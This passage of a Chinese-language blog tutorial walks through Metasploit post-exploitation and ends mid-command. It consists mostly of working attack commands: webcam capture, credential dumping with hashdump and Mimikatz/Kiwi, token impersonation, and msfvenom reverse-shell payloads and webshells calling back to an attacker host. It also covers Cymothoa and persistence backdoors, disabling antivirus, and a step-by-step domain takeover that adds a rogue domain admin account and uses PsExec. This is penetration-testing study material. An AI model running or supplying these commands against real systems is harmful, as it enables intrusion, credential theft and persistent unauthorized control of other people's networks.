post/windows/gather/enum_applications<br><span class="hljs-comment"># 抓取自动登录用户的用户名和密码</span><br>run windows/gather/credentials/windows_autologin <span class="hljs-comment"># 此处需要用到插件Espia应提前加载</span><br><span class="hljs-comment"># 加载插件</span><br>load espia<br><span class="hljs-comment"># 获取截图</span><br>screengrab<br><span class="hljs-comment"># 或</span><br>screenshot<br></code></pre></div></td></tr></table></figure><p>比较有趣的命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标机是否有摄像头</span><br>webcam_list<br><span class="hljs-comment"># 开启摄像头并拍照</span><br>webcam_snap<br><span class="hljs-comment"># 开启直播模式</span><br>webcam_stream<br><span class="hljs-comment"># 命令行shell</span><br>shell<br></code></pre></div></td></tr></table></figure><h2 id="4-2-文件系统命令"><a href="#4-2-文件系统命令" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录</span><br><span class="hljs-built_in">pwd</span> 或 getwd<br><span class="hljs-comment"># 查看当前属于本地那个目录</span><br>getlwd<br><span class="hljs-comment"># 搜索以txt为扩展名的文件</span><br><span class="hljs-comment"># -f 表示用户指定搜索文件模式</span><br><span class="hljs-comment"># -d 用于指定再那个目录下进行搜索</span><br>search -f *.txt -d c:\<br><span class="hljs-comment"># 下载目标机的内容到本机</span><br>download c:\text.txt /root<br><span class="hljs-comment"># 上传文件到目标机</span><br>upload /root/text.txt c:\ <br></code></pre></div></td></tr></table></figure><h2 id="4-3-权限提升"><a href="#4-3-权限提升" class="headerlink" title="4.3 权限提升"></a>4.3 权限提升</h2><p>提升权限分为</p><ul><li>纵向提权：低权限角色获得高权限角色的权限</li><li>横向提权：获取同级别角色的权限</li></ul><p>在windows系统中使用命令<code>whoami /groups</code>查看当前用户的权限</p><p>首先使用<code>getuid</code>查看已经获取的权限</p><p>尝试使用<code>getsystem</code>命令提权如果失败，根据目标机系统的情况，输入<code>systeminfo</code>命令查询，或通过查询C:\windows\里留下的补丁号”.log”查看目标机大概打了哪些补丁</p><p>根据获取的内容进行查找没有打补丁的来进行提权</p><p>漏洞具体信息分析和共享参考如下网站</p><ol><li><a href="http://www.securityfocus.com/bid">安全焦点</a></li><li><a href="http://www.exploitdb.com/">Exploit-DB</a></li></ol><p><strong>知识点</strong>：WMIC是Windows Management Instrumentation Commandline的简称，是一款命令行管理工具，提供了从命令行接口到批命令脚本执行系统管理的支持</p><p>使用WMIC可以管理本地计算机和同一域中的所有计算机(需要对应的权限)，且被管理远程计算机不需要事先安装WMIC</p><p>WMIC.exe可以使用交互模式和非交互模式</p><p>更新msf命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfupdate<br></code></pre></div></td></tr></table></figure><p>使用提权EXP如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 首先切换到后台</span><br>background<br><span class="hljs-comment"># 选中对应的exploit</span><br>use windows/**<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure><p>其它方法</p><h3 id="4-3-1-令牌窃取"><a href="#4-3-1-令牌窃取" class="headerlink" title="4.3.1 令牌窃取"></a>4.3.1 令牌窃取</h3><p>令牌(Token)是系统临时密钥，它允许在不提供密码等凭证的情况下访问网络和系统资源</p><p>令牌一般是不可预测的，且密码形式较多。</p><p>首先需要了解Kerberos协议，其工作机制如图</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804100909.png"></p><p>客户端请求过程：</p><ol><li>客户端向认证服务器(AS)发送请求，要求得到服务器的证书</li><li>AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。改证书包括服务器ticket(包括服务器密钥加密的客户机身份和一份会话密钥)和一个临时加密密钥(又称为会话密钥，session key)。认证服务器也会给服务器发送一份该证书，用来使服务器认证登录客户端的身份</li><li>客户端将ticket传送到服务器上，服务器确认该客户端的话，允许它登录服务器</li><li>客户端登录成功后，攻击者可以通过入侵服务器获取客户端的令牌</li></ol><p>通过假冒令牌实战</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use incognito<br><span class="hljs-comment"># 获取可用的token</span><br>list_tokens -u<br><span class="hljs-comment"># 假冒该令牌</span><br>impersonate_token 可用的token <span class="hljs-comment"># 中间使用双斜杠</span><br><br><span class="hljs-comment"># 最后查看权限</span><br>whoami<br></code></pre></div></td></tr></table></figure><h3 id="4-3-2-hash攻击"><a href="#4-3-2-hash攻击" class="headerlink" title="4.3.2 hash攻击"></a>4.3.2 hash攻击</h3><ol><li><p>使用Hashdump抓取密码</p><p>Hashdump Meterpreter脚本能够从目标机中提取Hash值，破解Hash值后即可获得登录密码，计算机中用户和密码都存储在sam文件中，当计算机运行时，该文件对所有账号进行锁定，必须需要系统级账号才能访问</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 获取Hash值</span><br>hashdump<br><span class="hljs-comment"># smart_hashdump功能更加强大</span><br>run windows/gether/smart_hashdump<br></code></pre></div></td></tr></table></figure><p>smart_hashdump工作流程</p><ul><li>检查Meterpreter会话的权限和目标机操作系统类型</li><li>检查目标机是否为域控制服务器</li><li>首先尝试从注册表中读取Hash，不行再尝试注入LSASS进程</li></ul><p>hash破解网站</p><p><a href="http://www.cmd5com/">http://www.cmd5com/</a></p><p><a href="http://www.xmd5com/">http://www.xmd5com/</a></p></li><li><p>使用Quarks PwDump抓取密码</p><p>PwDump是win32环境下的系统授权信息导出工具</p><p>目前可以导出：</p><ul><li>Local accounts NT/LM hashes+history(本机NT/LM哈希)+历史登录记录</li><li>Domain accounts NT/LM hashes+history(域中的NT/LM哈希)+历史登录记录</li><li>Cached domain password 缓存中的域管理密码</li><li>Bitlocker recovery information (recovery passwords&amp;key packages) 使用Bitlocker的恢复功能后遗留发信息</li></ul><p>运行Quarks PwDump.exe 默认显示帮助信息</p></li><li><p>使用Windows Credentials Editor 抓取密码</p><p>WCE是windows内网渗透工具，能够列举登录会话，并可以增加，改变，删除相关凭证(如LM/NT Hash)但是必须再管理员权限下使用，还需要注意杀毒工具的免杀</p><p>上传之后，打开wce.exe 使用命令wce -w即可提取系统明文管理员的密码</p><p>-f 强制使用安全的方式读取</p><p>-g 计算密码</p><p>-l 读取密码(安全读取无效后尝试不安全方式读取)</p></li><li><p>使用Minikatz抓取密码</p><p>该程序已经作为一个Meterpreter脚本集成了，同样需要管理员权限运行(现在已经被kiwi替代了)</p><p>在64位操作系统中需要将进程迁移到一个64位程序中才能使用查看系统密码明文</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bas"># 加载插件<br>load mimikatz<br># 查看帮助<br>help mimikatz<br># 使用全部功能<br>mimikatz_command<br># 使用:语法请求某个模块可用的选项，也在选定一个模块后查看帮助<br>mimikatz_comman -f a::<br># 获取系统Hash值<br>msv<br># 抓取系统票据<br>kerberos<br># 获取系统账户信息<br>wdigest<br># 输入sandump查看可用选项 之后抓取hash<br>mimikatz_command -f samdump::hashes<br></code></pre></div></td></tr></table></figure><p>关于mimikatz的其它内容参考<a href="http://blog.gentilkiwi.com/">Benjamin Delpy博客</a></p><p>关于kiwi的使用帮助</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">help kiwi<br>Kiwi Commands<br>=============<br>Command                Description<br>-------                -----------<br>creds_all              #列举所有凭据/所有的系统密码<br>creds_kerberos         #列举所有kerberos凭据<br>creds_msv              #列举所有msv凭据<br>creds_ssp              #列举所有ssp凭据<br>creds_tspkg            #列举所有tspkg凭据<br>creds_wdigest          #列举所有wdigest凭据<br>dcsync                 #通过DCSync检索用户帐户信息<br>dcsync_ntlm            #通过DCSync检索用户帐户NTLM散列、SID和RID<br>golden_ticket_create   #创建黄金票据<br>kerberos_ticket_list   #列举kerberos票据<br>kerberos_ticket_purge  #清除kerberos票据<br>kerberos_ticket_use    #使用kerberos票据<br>kiwi_cmd               #kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令<br>lsa_dump_sam           #dump出lsa的SAM<br>lsa_dump_secrets       #dump出lsa的密文<br>password_change        #修改密码<br>wifi_list              #列出当前用户的wifi配置文件<br>wifi_list_shared       #列出共享wifi配置文件/编码<br></code></pre></div></td></tr></table></figure></li></ol><h2 id="4-4-移植漏洞利用代码模块"><a href="#4-4-移植漏洞利用代码模块" class="headerlink" title="4.4 移植漏洞利用代码模块"></a>4.4 移植漏洞利用代码模块</h2><p>MS17-010(“想哭”勒索软件)的漏洞利用模块Metasploit已经集成，但是不支持渗透Windows 2003系统，网上有支持的渗透脚本<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar_Metasploit">GitHub地址</a></p><p>将模块克隆到本地，接着将Eternalblue-Doublepulsar_Metasploit文件下的eternalblue-doublepulsar.rb复制到/usr/share/metasploit-framework/modules/exploit/windows/smb下，在MSF中，应当了解漏洞利用模块代码存储的文件夹文章。</p><p>之后重新加载</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfconsole<br><span class="hljs-comment"># 重新加载全部文件</span><br>reload_all<br></code></pre></div></td></tr></table></figure><p>攻击前需要根据目标系统生成对应的dll文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 64位</span><br>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.1 lport=2222 -f dll -o xk_64.dll<br><span class="hljs-comment"># 32位</span><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 -f dll -o xk_32.dll<br></code></pre></div></td></tr></table></figure><p>利用该模块</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> processinject lsass.exe<br><span class="hljs-built_in">set</span> rhost 192.168.1.2<br><span class="hljs-built_in">set</span> targetarchitecture x86<br><span class="hljs-built_in">set</span> winepath /root/.wine/drive_c <span class="hljs-comment">#(默认DLL生成文件，可以修改)</span><br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.1<br><span class="hljs-built_in">set</span> lport 4444 <span class="hljs-comment"># (该端口不可修改，否则无法成功)</span><br><span class="hljs-built_in">set</span> target 9<br></code></pre></div></td></tr></table></figure><h1 id="5-后门"><a href="#5-后门" class="headerlink" title="5. 后门"></a>5. 后门</h1><p>后门是留在目标主机上的程序，使得攻击者随时连接到目标主机</p><h2 id="5-1-操作系统后门"><a href="#5-1-操作系统后门" class="headerlink" title="5.1 操作系统后门"></a>5.1 操作系统后门</h2><ol><li><p>Cymothoa后门</p><p>Cymothoa是一款可以将ShellCode注入现有进程的后门工具</p><p>利用注入手段能够将ShellCode伪装成常规程序，且与注入的程序共存。即使目标系统的安全防护工具能够监视可执行程序的完整性，只要不检查内存就发现不了后门程序</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查看目标主机的进程 linux</span><br>ps -aux<br><span class="hljs-comment"># windows</span><br>tasklist<br><span class="hljs-comment"># 使用Cymothoa 通过-p指定目标进程的PID，通过-s指定ShellCode的编号</span><br><span class="hljs-comment"># 需要将Cymothoa的可执行程序复制到目标主机上，生成后门程序</span><br><span class="hljs-comment"># 此处将PID 982的进程选择为宿主进程，选用第一类ShellCode，指定payload服务端口为4444</span><br>cymothoa -p 982 -s 1 -y 4444<br><span class="hljs-comment"># 成功后通过如下命令连接</span><br>Nc -nvv 192.168.1.1 4444<br></code></pre></div></td></tr></table></figure></li><li><p>Persistence 后门</p><p>Persistence 是一款使用安装自启动方式的持久性后门程序，可以利用它创建注册和文件，run persistence -h 查看所有命令选项</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 语法解释</span><br><span class="hljs-comment"># A 自启动Payload程序</span><br><span class="hljs-comment"># S 系统启动时自动加载</span><br><span class="hljs-comment"># U 用户登录时自动启动</span><br><span class="hljs-comment"># X 开机时自动启动</span><br><span class="hljs-comment"># i 回连的时间间隔</span><br><span class="hljs-comment"># P 监听反向连接端口号</span><br><span class="hljs-comment"># r 目标机器的IP地址</span><br>run persistence -A -S -U -i 60 -p 4321 -r 192.168.1.1<br></code></pre></div></td></tr></table></figure><p>此时应该会再获取一个session</p><p><strong>知识点</strong>：该脚本需要再目标机器上创建文件从而触发杀毒软件，建议运行前关闭杀毒软件</p></li></ol><h2 id="5-2-Web后门"><a href="#5-2-Web后门" class="headerlink" title="5.2 Web后门"></a>5.2 Web后门</h2><p>泛指WebShell，实质是一段网页代码</p><ol><li><p>Meterpreter后门</p><p>利用PHP Meterpreter的Payload，利用该模块创建具有Meterpreter功能的PHP WebShell。具体步骤</p><ol><li>使用msfvenom创建一个webshell.php</li><li>上传webshell.php到目标服务器</li><li>运行Metasploit multi-handler开始监听</li><li>访问webshell.php界面</li><li>获得反弹的Metasploit Shell</li></ol><p>具体命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.1 -f raw &gt; tmp.php<br></code></pre></div></td></tr></table></figure><ul><li>-p 用于设置Payload</li><li>-f 用于设置输出文件格式</li></ul><p>上传到服务器后，启动msfconsole进行监听</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.1<br>run<br></code></pre></div></td></tr></table></figure><p>之后访问上传的地址，之后会发现服务端反弹成功</p></li><li><p>Aspx Meterpreter后门</p><p>介绍metasploit下的shell_reverse_tcp 的Payload，利用该模块可创建具有Meterpreter功能的各版本ShellCode，例如Asp,Aspx,msi,vbs,war等以下以Aspx为例</p><p>大致流程与之前的PHP Shell相同</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">show payloads<br>use windows/shell_reverse_tcp<br>info<br><span class="hljs-built_in">set</span> lhost 192.168.31.247<br><span class="hljs-built_in">set</span> lport 4666<br>save<br><span class="hljs-comment"># 接着输入generate -h查看帮助命令</span><br>generate -h<br><span class="hljs-comment"># 生成个版本的ShellCode命令如下</span><br>generate -t asp <span class="hljs-comment"># 生成asp的shellcode</span><br>generate -t aspx <span class="hljs-comment"># 生成aspx的shellcode</span><br><br><span class="hljs-comment"># 使用如下命令进行监听</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.31.247<br><span class="hljs-built_in">set</span> lport 4666<br>run<br></code></pre></div></td></tr></table></figure></li></ol><h1 id="6-内网域渗透实例"><a href="#6-内网域渗透实例" class="headerlink" title="6. 内网域渗透实例"></a>6. 内网域渗透实例</h1><h2 id="6-1-渗透环境介绍"><a href="#6-1-渗透环境介绍" class="headerlink" title="6.1 渗透环境介绍"></a>6.1 渗透环境介绍</h2><p>首先介绍此次渗透的环境：假设我们现在已经渗透了一台服务器PAVMSEF21，该服务器内网IP为10.51.0.21。扫描后发现内网网络结构大概如下图所示，其中PAVMSEF21是连接外网和内网的关键节点，内网的其他服务器均不能直接连接</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804152818.png"></p><p>假设此时我们已经获取了普通的WebShell</p><h2 id="6-2-提升权限"><a href="#6-2-提升权限" class="headerlink" title="6.2 提升权限"></a>6.2 提升权限</h2><p>上传payload到机器21上，之后使用meterpreter监听获取Meterpreter Shell</p><p>之后查看目标机权限发现是普通域用户权限</p><p>查看目标系统的信息，发现服务器补丁打的很全参数使用MS1505和MS15078</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/ms15_051_client_copy_image<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure><p>最后两个都失败了</p><p>再尝试绕过Windows账户控制(UAC)，使用Bypass UAC模块提权，又失败了，如果成功会返回一个新的Meterpreter Shell</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/<span class="hljs-built_in">local</span>/bypassuac<br><span class="hljs-built_in">set</span> session 1<br>run<br></code></pre></div></td></tr></table></figure><p>使用Bypass UAC模块提权，需要系统当前用户在管理员组，且用户账户管理程序UAC设置为默认</p><h2 id="6-3-信息收集"><a href="#6-3-信息收集" class="headerlink" title="6.3 信息收集"></a>6.3 信息收集</h2><p>虽然此时的提权不成功，但还是可以进行域渗透测试的。有了内网的第一台机器的权限后，就到了很关键的一步——收集信息，它也是内网渗透中不可或缺的一部分。<br>首先要查看当前机器的网络环境，收集域里的相关信息，包括所有的用户、所有的计算机，以及相关关键组的信息，下面列出了常用的命令及其作用</p><ul><li>net user /domain：查看域用户</li><li>net view /domain：查看有几个域</li><li>net view /domain： XXX：查看域内的主机</li><li>net group /domain：查看域里面的组</li><li>net group “domain computers” /domain：查看域内所有的主机名</li><li>net group “domain admins” /domain：查看域管理员</li><li>net group “domain controllers” /domain：查看域控制器</li><li>net group “enterprise admins” /domain：查看企业管理组</li><li>net time /domain：查看时间服务器</li></ul><p>通过收集以上信息,我们可以分析出很多重要的线索，例如内网是怎么划分的，各机器名的命名规则，根据机器名尝试找出重要人物的计算机，以及目标机是否为多层域结构,关键是要探测出域管理员的名字和域服务器的名字等信息</p><h2 id="6-4-获取一台服务器的权限"><a href="#6-4-获取一台服务器的权限" class="headerlink" title="6.4 获取一台服务器的权限"></a>6.4 获取一台服务器的权限</h2><p>我们的目标是域服务器，此时有两种情况，当前服务器可以总结攻击域服务器，和不可直接攻击域服务器。不可攻击又分为两种情况：如果是权限不够就需要提升权限；如果是不能连接到域服务器，则需要攻击内网中能够连接到域服务器的服务器</p><p>当前是因为权限问题无法攻击，可以尝试以下方法</p><ol><li>使用Meterpreter目前拥有的权限添加内网路由，进行弱口令扫描</li><li>使用PowerShell对内网进行扫描(要求目标机是Windows 7以上的服务器)</li><li>架设Socks4a，然后Socks会自动进行内网扫描</li><li>利用当前权限进行内网IPC$渗透</li><li>其他方法</li></ol><p>通过上面的分析，我们先选择最简单的方法，输入net view命令，在列举的机器名里选择一个和我们机器名相似的服务器来试试，不出意外的话，成功率很高</p><p>此处温习经典IPC$入侵</p><p>IPC$入侵：即通过使用Windows 系统中默认启动的IPC$共享获得计算机控制权的入侵，在内网中极其常见<br>假设现在有一台IPC$主机:127.0.0.25，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net use \127.0.0.25Vipc$ <span class="hljs-comment">#连接127.0.0.25的IPC$共享</span><br>copy srv.exe \127.0.0.25\ipc$ <span class="hljs-comment">#复制srv.exe到目标主机</span><br>net time \127.0.0.25 <span class="hljs-comment">#查时间</span><br>at \127.0.0.25 10: 50 srv.exe <span class="hljs-comment">#用at命令在10点50分启动srv.exe (注意这里设置的时间要比主机时间快)</span><br></code></pre></div></td></tr></table></figure><p>at是让机器在指定时间做指定的事情的命令</p><p>这里将payload上传到服务器，at启动，获取对应的Meterpreter Shell</p><p>同理查看在该机器上的权限和相关信息</p><p>此时获得了目标机的system权限，此时可以使用Mimikatz等工具和run post/windows/gather/hashdump来抓hash。同样需要注意Mimikatz在64位机器上需要将进程迁移到64位程序进程中才能查看密码明文</p><p>此处能够利用Mimikatz获取</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">upload mi.exe c:\<br>mi.exe <span class="hljs-comment"># j即可获取明文密码</span><br></code></pre></div></td></tr></table></figure><p>接着查看抓到的域用户权限</p><p>net user joao.guerino /domain</p><h2 id="6-5-PowerShell-寻找域管在线服务器"><a href="#6-5-PowerShell-寻找域管在线服务器" class="headerlink" title="6.5 PowerShell 寻找域管在线服务器"></a>6.5 PowerShell 寻找域管在线服务器</h2><p>Windows PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用.NET Framework的强大功能。PowerShell还允许将几个命令组合起来放到文件里执行，实现文件级的重用，也就是说具有脚本的性质</p><p>这里先使Power View脚本来获取当域管理员在线登录的服务器，我们将Power View脚本的Invoke-User Hunter模块上传到主机名为PAVMSEP131，IP为10.51.0.131的服务器中，然后输入Invoke-UserHunter<br>具体命令如下所示</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -Command<br><span class="hljs-string">&quot;&amp;(Import-Module.\powerview.ps1;lnvoke-UserHunter&#125;&quot;</span><br></code></pre></div></td></tr></table></figure><p>结果如图</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210804163728.png"></p><p>可以看到域管理员当前在线登录的主机名位30 IP为10.51.0.30，此时需要入侵此服务器，然后将其迁移到域管理所在的进程，这样便拥有了域管理的权限</p><h2 id="6-6-获取域管权限"><a href="#6-6-获取域管权限" class="headerlink" title="6.6 获取域管权限"></a>6.6 获取域管权限</h2><p>现在已经成功地获取主机名为PAVMSXD30，IP为10.51.0.30的服务器权限,接下来就可以渗透域控了。首先输入getsystem命令提升权限，成功获得权限</p><p>然后输入ps命令找到域管理所在的进程，把Meterpreter Shell进程迁移到此进程中,成功后就获得了域管理权限</p><p>这里除了迁移进程，也可以使用Metasploit中的窃取令牌功能，同样能获得获得域管理权限。<br>接着查看主域控IP，这里使用net time命令，一般来说时间服务器都是域服务器</p><p>这里可以得到域服务器的主机名为PAVMSAD64，IP地址为10.51.0.63</p><p>现在我们依旧使用经典的IPC$入侵来反弹一个Meterpreter Shell，和之前相同这里提示at已经被废除，所以改换使用<code>schtasks</code>来添加计划任务</p><p>现在在域管理原权限下了，所以再添加一个管理员账户</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net user sonicwall passw0rk!@3 /ad /domain<br><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> sonicwall /ad /domain<br><span class="hljs-comment"># 使用如下命令确认是否添加成功</span><br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain<br></code></pre></div></td></tr></table></figure><h2 id="6-7-登录域控制"><a href="#6-7-登录域控制" class="headerlink" title="6.7 登录域控制"></a>6.7 登录域控制</h2><p>现在已经获取了域控的权限，接下来登录域控然后抓取域控的Hash</p><p>常见登录方式：</p><ul><li>利用IPC上传AT&amp;Schtasks远程执行命令</li><li>利用端口转发或者Socks登录域控远程桌面</li><li>登录对方内网的一台计算机使用PsTools工具包中的PsExec来反弹Shell</li><li>使用Metasploit下的PsExec.、psexec_psh、lmpacket psexec、pth-winexe、Empire Invoke-Psexec等PsExec类工具反弹Shell</li><li>使用Metasploit下的smb_login来反弹Meterpreter</li><li>使用WMI (Windows Management Instrumentation)来进行攻击</li><li>使用PsRemoting posershel远程执行命令</li><li>其他一些方法</li></ul><p>这里采用最常见也是效果最好的方式，即Metasploit下的PsExec来反弹Meterpreter，使用时要注意以下这两点</p><ul><li>MSF中的PsExec模块</li><li>cuestom模块，建议使用类似Veil之类的工具来生成免杀的Payload</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> smbuser sonicwalll<br><span class="hljs-built_in">set</span> smbpass Passw0rk!@3<br><span class="hljs-built_in">set</span> smbdomain HEDABIL<br><span class="hljs-built_in">set</span> rhost 